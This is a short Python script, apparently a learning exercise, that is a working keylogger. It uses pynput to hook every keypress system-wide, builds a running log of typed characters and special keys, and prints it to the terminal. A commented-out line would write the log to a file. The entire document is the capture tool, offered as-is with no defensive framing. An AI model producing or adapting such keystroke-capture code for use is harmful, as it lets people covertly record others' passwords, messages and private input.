#!/usr/bin/python3
import pynput.keyboard 

log = ""

def process_keys(key):
  # print(key)   ---> you can use it to see the keys in terminal for testing purpose
  global log
  try:
# by this it will print the previous chracter also in the log
    log = log + str(key.char)
  except AttributeError:
    if key == key.space:
      log = log + " "
    else:
        log = log + " " + str(key) + " "    # this is for the keys like enter,shift etc jo character me convert nhi ho skte
  print(log)






  # with open("log.txt","a") as fin:
  # 	fin.write(str(key))

keyboard_listener = pynput.keyboard.Listener(on_press=process_keys)
with keyboard_listener:
  keyboard_listener.join()

